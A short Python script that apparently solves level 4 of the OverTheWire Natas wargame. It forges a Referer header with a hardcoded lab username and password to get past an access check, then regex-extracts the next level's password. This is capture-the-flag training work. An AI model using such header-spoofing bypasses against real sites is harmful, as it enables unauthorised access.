import requests
import re


# level 4 => 5

Username = "natas4"
Password = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"

headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}
url = "http://{}.natas.labs.overthewire.org/".format(Username) 

response = requests.get(url,auth=(Username,Password),headers=headers)

content = response.text

#print(content)
flag = re.findall('Access granted. The password for natas5 is (.*)',content)[0]
print(flag)